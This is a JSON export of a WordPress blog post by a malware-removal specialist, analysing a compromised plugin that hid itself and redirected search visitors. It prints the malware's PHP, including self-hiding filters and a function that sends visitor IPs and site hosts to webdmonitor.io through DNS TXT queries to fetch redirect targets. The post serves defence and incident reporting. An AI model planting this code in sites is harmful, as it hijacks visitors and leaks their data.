{
  "id": 780,
  "slug": "how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic",
  "date": "2024-10-25T10:54:53",
  "modified": "2026-01-02T20:21:43",
  "title": "How I Caught and Removed a Hidden Malware Hijacking Google Traffic",
  "content": "<p>It was a typical morning when I received a panicked call from a client:</p>\n<p><em>&#8220;My website is redirecting visitors to unrelated sites whenever they come from Google searches! Sales have taken a massive hit, and I have no idea what&#8217;s going on!&#8221;</em></p>\n<p>The client was understandably anxious. His business heavily relied on organic traffic from Google, and the sudden redirects were hurting user trust, leading to a significant drop in sales. This was an urgent issue that needed immediate attention. I knew I had to thoroughly investigate the WordPress site, focusing on potential malware that might be hidden within the ecosystem.</p>\n<h3>The Initial Investigation: Where is the Malware?</h3>\n<p>I started by using <strong>Sucuri</strong>, a popular website security tool that’s good at detecting malware. While the scan confirmed that malware was present, it couldn’t identify exactly where it was hiding. This indicated that the malware was advanced and well-concealed.</p>\n<p>To find it, I decided to manually dig into the site’s files and database. After downloading the database and combing through it, I finally found the malicious code. The malware was cleverly designed to hijack user sessions and redirect visitors to other websites, particularly those arriving from Google searches.</p>\n<p><img loading=\"lazy\" decoding=\"async\" class=\"wp-image-777 aligncenter\" src=\"https://cms.mdpabel.com/wp-content/uploads/2025/01/image-2025-01-16T113331.462.png\" alt=\"\" width=\"611\" height=\"320\" /></p>\n<h3>How the Malware Works: A Technical Breakdown</h3>\n<h4>1. Sneaky Admin Checks and Hiding in Plain Sight</h4>\n<p>The malware first checked if the user was an administrator and whether the URL didn’t contain a <code>show_all</code> parameter:</p>\n<pre>if (current_user_can('administrator') &amp;&amp; !array_key_exists('show_all', $_GET)) {\r\n// Hide WPCode elements\r\nadd_action('admin_print_scripts', function () {\r\necho '&lt;img src=\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7\" data-wp-preserve=\"%3Cstyle%3E'%3B%0A%20%20%20%20%20%20%20%20echo%20'%23toplevel_page_wpcode%20%7B%20display%3A%20none%3B%20%7D'%3B%0A%20%20%20%20%20%20%20%20echo%20'%23wp-admin-bar-wpcode-admin-bar-info%20%7B%20display%3A%20none%3B%20%7D'%3B%0A%20%20%20%20%20%20%20%20echo%20'%23wpcode-notice-global-review_request%20%7B%20display%3A%20none%3B%20%7D'%3B%0A%20%20%20%20%20%20%20%20echo%20'%3C%2Fstyle%3E\" data-mce-resize=\"false\" data-mce-placeholder=\"1\" class=\"mce-object\" width=\"20\" height=\"20\" alt=\"&amp;lt;style&amp;gt;\" title=\"&amp;lt;style&amp;gt;\" /&gt;';\r\n});\r\n\r\n// Conceal plugin from the plugin list\r\nadd_filter('all_plugins', function ($plugins) {\r\nunset($plugins['insert-headers-and-footers/ihaf.php']);\r\nreturn $plugins;\r\n});\r\n}\r\n</pre>\n<p><strong>What It Does:</strong> This code hides the WPCode plugin from the WordPress admin dashboard using CSS and removes it from the list of installed plugins.</p>\n<p><strong>Why It’s Dangerous:</strong> By hiding itself, the malware becomes very hard to find and remove. Administrators don’t see the plugin, making it less likely that they’ll disable or delete it.</p>\n<h4>2. Dynamic Redirects with DNS TXT Records</h4>\n<p>The most harmful part of the malware was its ability to redirect users through DNS queries:</p>\n<pre>function _red() {\r\nif (is_user_logged_in()) return;\r\n\r\n$ip = _user_ip();\r\nif (!$ip) return;\r\n\r\n$host = filter_var(parse_url('https://' . $_SERVER['HTTP_HOST'], PHP_URL_HOST), FILTER_VALIDATE_DOMAIN);\r\n$ips = str_replace(':', '-', $ip);\r\n$ips = str_replace('.', '-', $ips);\r\n\r\n$h = 'webdmonitor.io';\r\n$req = (!$host ? 'unk.com' : $host) . '.' . (!$ips ? '0-0-0-0' : $ips) . '.' . mt_rand(100000, 999999) . '.nd.' . $h;\r\n\r\ntry {\r\n$s = @dns_get_record($req, DNS_TXT);\r\n} catch (\\Exception $e) {}\r\n\r\nif (is_array($s) &amp;&amp; isset($s[0]['txt'])) {\r\n$s = base64_decode($s[0]['txt']);\r\nif (substr($s, 0, 4) === 'http') {\r\nwp_redirect($s);\r\nexit;\r\n}\r\n}\r\n}\r\n\r\nadd_action('init', '_red');\r\n</pre>\n<p><strong>What It Does:</strong> The <code>_red()</code> function builds a unique subdomain using the visitor&#8217;s IP, the site’s host, and a random number. It then performs a DNS TXT record lookup on that subdomain to get the redirect URL.</p>\n<p><strong>How It Works:</strong></p>\n<ul>\n<li><strong>Dynamic Subdomain Creation:</strong> The malware creates different subdomains for each visitor, making detection harder.</li>\n<li><strong>DNS TXT Record Lookups:</strong> The malware fetches redirect URLs without making any changes to the site’s database or files, so the attackers can change redirection targets without modifying the site.</li>\n<li><strong>Targeted Redirects:</strong> It only redirects non-logged-in users, specifically targeting those arriving from search engines, which makes it less likely for administrators to notice.</li>\n</ul>\n<h4>3. IP-Based and Device-Specific Redirections</h4>\n<p>The malware also adjusted its behavior based on the visitor’s IP and device type:</p>\n<ul>\n<li><strong>IP-Based Redirection:</strong> It uses the visitor’s IP to create unique subdomains, allowing it to create personalized redirection paths.</li>\n<li><strong>Device Detection:</strong> It differentiates between mobile devices, iPhones, and desktop users using the <code>HTTP_USER_AGENT</code>, tailoring the redirect accordingly.</li>\n</ul>\n<p><strong>Why It’s Effective:</strong> By customizing the attack based on IP and device, the malware becomes harder to detect. It avoids triggering for every user, making it less noticeable and reducing the chance of getting caught.</p>\n<h3>Best Practices to Prevent Future Attacks</h3>\n<p>To ensure that the site remains secure and avoid similar issues in the future, I recommended the following best practices:</p>\n<ul>\n<li><strong>Automate Regular Backups:</strong> Use plugins like <strong>UpdraftPlus</strong> or <strong>BackupBuddy</strong> to regularly back up the site’s files and database.</li>\n<li><strong>Limit Plugin Usage:</strong> Only use plugins from trusted sources and remove any unused or outdated plugins.</li>\n<li><strong>Enable Two-Factor Authentication (2FA):</strong> This adds an extra layer of security for administrator accounts, making it harder for attackers to gain access.</li>\n<li><strong>Harden WordPress Settings:</strong> Disable file editing in the WordPress dashboard, use a unique database prefix, and secure the <code>wp-config.php</code> file.</li>\n<li><strong>Perform Regular Security Audits:</strong> Use tools like <strong>Sucuri</strong> or <strong>Wordfence</strong> to regularly scan the site for malware and vulnerabilities.</li>\n</ul>\n<h3>Conclusion: How Vigilance Restored Traffic and Sales</h3>\n<p>This case demonstrates how even a widely used WordPress plugin can be compromised to host advanced malware. By finding and removing the malicious code, I was able to restore the website’s integrity and help the client recover lost traffic and sales.</p>\n<p>This experience underscores the importance of regular security audits, timely updates, and continuous monitoring. If you notice any unusual behavior on your site—such as unexpected redirects—take immediate action. Safeguard your online presence by staying proactive with robust security measures. And if you ever need expert help, our <a href=\"https://www.mdpabel.com/wordpress-malware-removal\">WordPress Malware Removal Service</a> is here to quickly clean, secure, and protect your website from future threats.</p>\n",
  "excerpt": "<p>It was a typical morning when I received a panicked call from a client: &#8220;My website is redirecting visitors to unrelated sites whenever they come from Google searches! Sales have taken a massive hit, and I have no idea what&#8217;s going on!&#8221; The client was understandably anxious. His business heavily relied on organic traffic from [&hellip;]</p>\n",
  "link": "https://cms.mdpabel.com/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/",
  "yoastHead": "<link rel=\"canonical\" href=\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\" />\n<!-- This site is optimized with the Yoast SEO Premium plugin v25.9 (Yoast SEO v26.8) - https://yoast.com/product/yoast-seo-premium-wordpress/ -->\n<title>How I Caught and Removed a Hidden Malware Hijacking Google Traffic - MD Pabel</title>\n<meta name=\"robots\" content=\"index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1\" />\n<meta property=\"og:locale\" content=\"en_US\" />\n<meta property=\"og:type\" content=\"article\" />\n<meta property=\"og:title\" content=\"How I Caught and Removed a Hidden Malware Hijacking Google Traffic\" />\n<meta property=\"og:description\" content=\"It was a typical morning when I received a panicked call from a client: &#8220;My website is redirecting visitors to unrelated sites whenever they come from Google searches! Sales have taken a massive hit, and I have no idea what&#8217;s going on!&#8221; The client was understandably anxious. His business heavily relied on organic traffic from [&hellip;]\" />\n<meta property=\"og:url\" content=\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\" />\n<meta property=\"og:site_name\" content=\"MD Pabel\" />\n<meta property=\"article:author\" content=\"https://www.mdpabel.com/author/mdpabel/\" />\n<meta property=\"article:published_time\" content=\"2024-10-25T10:54:53+00:00\" />\n<meta property=\"article:modified_time\" content=\"2026-01-02T20:21:43+00:00\" />\n<meta property=\"og:image\" content=\"https://cms.mdpabel.com/wp-content/uploads/2024/10/malware-1024x683.png\" />\n\t<meta property=\"og:image:width\" content=\"1024\" />\n\t<meta property=\"og:image:height\" content=\"683\" />\n\t<meta property=\"og:image:type\" content=\"image/png\" />\n<meta name=\"author\" content=\"MD Pabel\" />\n<meta name=\"twitter:card\" content=\"summary_large_image\" />\n<meta name=\"twitter:label1\" content=\"Written by\" />\n\t<meta name=\"twitter:data1\" content=\"MD Pabel\" />\n\t<meta name=\"twitter:label2\" content=\"Est. reading time\" />\n\t<meta name=\"twitter:data2\" content=\"4 minutes\" />\n<script type=\"application/ld+json\" class=\"yoast-schema-graph\">{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"TechArticle\",\"@id\":\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\",\"isPartOf\":{\"@id\":\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\"},\"author\":{\"name\":\"MD Pabel\",\"@id\":\"https://www.mdpabel.com/#/schema/person/73e3797b5dc8d6434e9e35e1708bb0c4\"},\"headline\":\"How I Caught and Removed a Hidden Malware Hijacking Google Traffic\",\"datePublished\":\"2024-10-25T10:54:53+00:00\",\"dateModified\":\"2026-01-02T20:21:43+00:00\",\"mainEntityOfPage\":{\"@id\":\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\"},\"wordCount\":760,\"commentCount\":0,\"image\":{\"@id\":\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\"},\"thumbnailUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2024/10/malware.png?wsr\",\"articleSection\":[\"Featured\",\"Malware Type\",\"seo-spam\",\"Website Security\"],\"inLanguage\":\"en-US\",\"potentialAction\":[{\"@type\":\"CommentAction\",\"name\":\"Comment\",\"target\":[\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\"]}]},{\"@type\":\"WebPage\",\"@id\":\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\",\"url\":\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\",\"name\":\"How I Caught and Removed a Hidden Malware Hijacking Google Traffic - MD Pabel\",\"isPartOf\":{\"@id\":\"https://www.mdpabel.com/#website\"},\"primaryImageOfPage\":{\"@id\":\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\"},\"image\":{\"@id\":\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\"},\"thumbnailUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2024/10/malware.png?wsr\",\"datePublished\":\"2024-10-25T10:54:53+00:00\",\"dateModified\":\"2026-01-02T20:21:43+00:00\",\"author\":{\"@id\":\"https://www.mdpabel.com/#/schema/person/73e3797b5dc8d6434e9e35e1708bb0c4\"},\"breadcrumb\":{\"@id\":\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\"},\"inLanguage\":\"en-US\",\"potentialAction\":[{\"@type\":\"ReadAction\",\"target\":[\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\"]}]},{\"@type\":\"ImageObject\",\"inLanguage\":\"en-US\",\"@id\":\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\",\"url\":\"https://cms.mdpabel.com/wp-content/uploads/2024/10/malware.png?wsr\",\"contentUrl\":\"https://cms.mdpabel.com/wp-content/uploads/2024/10/malware.png?wsr\",\"width\":1536,\"height\":1024},{\"@type\":\"BreadcrumbList\",\"@id\":\"https://www.mdpabel.com/blog/how-i-caught-and-removed-a-hidden-malware-hijacking-google-traffic/\",\"itemListElement\":[{\"@type\":\"ListItem\",\"position\":1,\"name\":\"Home\",\"item\":\"https://www.mdpabel.com/\"},{\"@type\":\"ListItem\",\"position\":2,\"name\":\"How I Caught and Removed a Hidden Malware Hijacking Google Traffic\"}]},{\"@type\":\"WebSite\",\"@id\":\"https://www.mdpabel.com/#website\",\"url\":\"https://www.mdpabel.com/\",\"name\":\"MD Pabel\",\"description\":\"Full Stack Developer, Malware Removal &amp; Security Specialist\",\"potentialAction\":[{\"@type\":\"SearchAction\",\"target\":{\"@type\":\"EntryPoint\",\"urlTemplate\":\"https://www.mdpabel.com/blog/?s={search_term_string}\"},\"query-input\":{\"@type\":\"PropertyValueSpecification\",\"valueRequired\":true,\"valueName\":\"search_term_string\"}}],\"inLanguage\":\"en-US\"},{\"@type\":\"Person\",\"@id\":\"https://www.mdpabel.com/#/schema/person/73e3797b5dc8d6434e9e35e1708bb0c4\",\"name\":\"MD Pabel\",\"image\":{\"@type\":\"ImageObject\",\"inLanguage\":\"en-US\",\"@id\":\"https://www.mdpabel.com/#/schema/person/image/\",\"url\":\"https://secure.gravatar.com/avatar/b6b48a60efe9dc8cd04d4a7e5c9b22cafd47332f65a407ce270e8ad7f8843372?s=96&d=mm&r=g\",\"contentUrl\":\"https://secure.gravatar.com/avatar/b6b48a60efe9dc8cd04d4a7e5c9b22cafd47332f65a407ce270e8ad7f8843372?s=96&d=mm&r=g\",\"caption\":\"MD Pabel\"},\"description\":\"MD Pabel is the Founder and CEO of 3Zero Digital, a leading agency specializing in custom web development, WordPress security, and malware removal. With over 7+ Years of experience, he has completed more than3200+ projects, served over 2300+ clients, and resolved4500+ cases of malware and hacked websites.\",\"sameAs\":[\"https://www.mdpabel.com/\",\"https://www.facebook.com/in/mdpabe1\",\"https://www.linkedin.com/in/mdpabe1\"],\"url\":\"https://www.mdpabel.com/author/mdpabel/\"}]}</script>\n<!-- / Yoast SEO Premium plugin. -->",
  "featuredImage": {
    "url": "https://cms.mdpabel.com/wp-content/uploads/2024/10/malware.png",
    "alt": ""
  },
  "categories": [
    {
      "id": 22,
      "name": "Featured",
      "slug": "featured"
    },
    {
      "id": 64,
      "name": "Malware Type",
      "slug": "malware-type"
    },
    {
      "id": 66,
      "name": "seo-spam",
      "slug": "seo-spam"
    },
    {
      "id": 13,
      "name": "Website Security",
      "slug": "website-security"
    }
  ],
  "acf": {
    "issue_reported": "",
    "malware_type": "",
    "location_of_infection": "",
    "result": "",
    "custom_schema": ""
  }
}